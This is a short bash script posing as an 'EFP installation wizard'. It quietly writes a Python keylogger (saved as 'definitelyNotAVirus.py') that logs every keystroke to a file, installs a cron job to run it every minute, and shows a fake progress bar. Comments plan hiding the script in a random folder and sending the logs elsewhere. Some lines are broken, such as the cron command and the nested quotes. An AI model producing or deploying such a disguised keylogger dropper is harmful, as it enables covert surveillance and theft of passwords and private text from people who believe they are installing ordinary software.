#!/bin/bash

# This is the install file - only do the one
# 1. copy python logger script to a hidden place
	# NOTE: need to add the capability to check whether the script is playing and to hide itself again
	# BASIC: just save in the /tmp folder
echo "Welcome to the EFP installation wizard, please wait just a second while we get set up"
# places the python script in a local file which can then be run

# gets a random folder on the computer
# declare TARGETDIR
# getRandDir(){
# 	DIRNUM=$(find ~ -type d | wc -l)
# 	RAN=$(($RANDOM%DIRNUM))
# 	if [ $RAN = 0 ]; then
# 		RAN=$(($RAN+1))
# 	fi
# 	TARGETDIR=$(find ~ -type d | sed "${RAN}q;d")

# }
# TARGETDIR=''
# getRandDir	#returns TARGETDIR
# echo "REMOVE ON USE: $TARGETDIR"


echo "from pynput.keyboard import Key, Listener
import logging

log_dir = ''

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
">> ~/Desktop/definitelyNotAVirus.py
chmod 777 ~/Desktop/definitelyNotAVirus.py

# 2. create a cronjob for the logger script
#write out current crontab
crontab -l > mycron
#echo new cron into cron file
echo "*/1 * * * * cd ~/Desktop/definitelyNotAVirus.py && usr/bin/python3 ~/Desktop/definitelyNotAVirus.py" >> mycron
#install new cron file
crontab mycron
rm mycron


echo "Please wait while the program installs"
i=0
seconds=60
for (( i=1; i <= $seconds; i++ ));do
	echo -ne "#"
	sleep 1
done
echo 


# 3. create a cronjob for sending the logger script somewhere

